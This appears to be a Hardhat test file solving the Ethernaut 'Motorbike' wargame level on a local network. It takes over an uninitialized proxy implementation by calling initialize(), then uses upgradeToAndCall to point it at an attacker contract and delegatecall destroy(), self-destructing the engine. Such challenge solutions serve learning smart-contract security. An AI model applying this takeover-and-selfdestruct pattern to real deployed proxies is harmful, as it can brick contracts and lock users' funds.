import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let eoa: Signer;
let other1: Signer;
let other2: Signer;
let attacker: Contract;
let motorbike: Contract;
let engine: Contract;
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, other1, other2] = accounts;

  const engineFactory = await ethers.getContractFactory('Engine')
  engine = await engineFactory.connect(other2).deploy()

  const motorbikeFactory = await ethers.getContractFactory('Motorbike')
  motorbike = await motorbikeFactory.connect(other2).deploy(engine.address)
});

it("solves the challenge", async function () {

  // initialize() was not called on the logic contract
  await engine.connect(eoa).initialize()

  // set new implementation address & delegatecall to selfdestruct
  const attackerFactory = await ethers.getContractFactory('MotorbikeAttacker')
  attacker = await attackerFactory.connect(eoa).deploy()

  console.log(await engine.upgrader())

  let functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("destroy()")).substring(0,10)
  await engine.connect(eoa).upgradeToAndCall(attacker.address,functionSig)
  
});

after(async () => {
  await expect(engine.upgrader()).to.be.reverted;
});
